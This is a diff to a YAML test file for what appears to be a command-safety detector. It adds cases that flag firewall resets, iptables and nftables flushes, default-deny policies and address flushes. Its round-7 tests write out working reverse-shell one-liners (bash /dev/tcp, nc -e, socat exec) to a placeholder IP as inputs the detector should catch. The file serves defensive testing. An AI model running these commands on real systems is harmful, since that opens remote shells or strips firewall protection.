@@ -128,8 +128,8 @@
 - test: "sudo ufw --force reset"
   description: "match command with sudo"
   expect_ids: ["network:force_reset_firewall"]
-- test: "ufw reset"
-  description: "should not match without force flag"
+- test: "ufw status"
+  description: "status changes nothing"
   expect_ids: []
 - test: "ufw status"
   description: "should not match status command"
@@ -165,8 +165,8 @@
 
 # -- network:force_reset_firewall — flag ordering --
 - test: "ufw reset --force"
-  description: "BUG: --force after reset, not matched"
-  expect_ids: []
+  description: "--force after reset"
+  expect_ids: ["network:force_reset_firewall"]
 
 # -- network:flush_nftables --
 - test: "nft flush ruleset"
@@ -224,3 +224,63 @@
 - test: "ip6tables -F"
   description: "match ip6tables flush rules"
   expect_ids: ["network:flush_iptables"]
+# -- network:iptables_default_drop (R4) --
+- test: 'iptables -P INPUT DROP'
+  description: "default DROP on INPUT"
+  expect_ids: ["network:iptables_default_drop"]
+- test: 'ip6tables --policy OUTPUT DROP'
+  description: "ip6tables default DROP"
+  expect_ids: ["network:iptables_default_drop"]
+- test: 'iptables -P INPUT ACCEPT'
+  description: "negative: ACCEPT policy"
+  expect_ids: []
+# -- round 5: option order (Omar R4 N2) --
+- test: "iptables --flush"
+  description: "long --flush"
+  expect_ids: ["network:flush_iptables"]
+- test: "iptables -w -F"
+  description: "-F after another option"
+  expect_ids: ["network:flush_iptables"]
+- test: "iptables -t filter -F"
+  description: "the filter table"
+  expect_ids: ["network:flush_iptables"]
+- test: "iptables -t nat --flush"
+  description: "the nat table is flush_nat_rules"
+  expect_ids: ["network:flush_nat_rules"]
+- test: "iptables -w --delete-chain"
+  description: "long --delete-chain"
+  expect_ids: ["network:delete_custom_chains"]
+- test: "ufw reset"
+  description: "ufw reset without --force"
+  expect_ids: ["network:force_reset_firewall"]
+- test: "iptables -L -n"
+  description: "listing rules is fine"
+  expect_ids: []
+# -- round 7 (omar-r6:R6-3, rosa-r6:R6-7) --
+- test: "sudo ip addr flush dev eth0"
+  description: "removing the interface addresses"
+  expect_ids: ["network:flush_addresses"]
+- test: "ip addr show"
+  description: "negative: listing addresses"
+  expect_ids: []
+- test: "sudo ufw default deny incoming"
+  description: "deny incoming by default"
+  expect_ids: ["network:ufw_default_deny"]
+- test: "sudo ufw allow OpenSSH"
+  description: "negative: allowing ssh"
+  expect_ids: []
+- test: "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
+  description: "a bash reverse shell"
+  expect_ids: ["network:reverse_shell"]
+- test: "nc -e /bin/sh 1.2.3.4 4444"
+  description: "netcat with -e"
+  expect_ids: ["network:reverse_shell"]
+- test: "socat tcp:1.2.3.4:4444 exec:/bin/sh"
+  description: "socat exec"
+  expect_ids: ["network:reverse_shell"]
+- test: "timeout 1 bash -c '</dev/tcp/db/5432'"
+  description: "negative: a /dev/tcp port probe"
+  expect_ids: []
+- test: "nc -zv db 5432"
+  description: "negative: a port scan of one port"
+  expect_ids: []
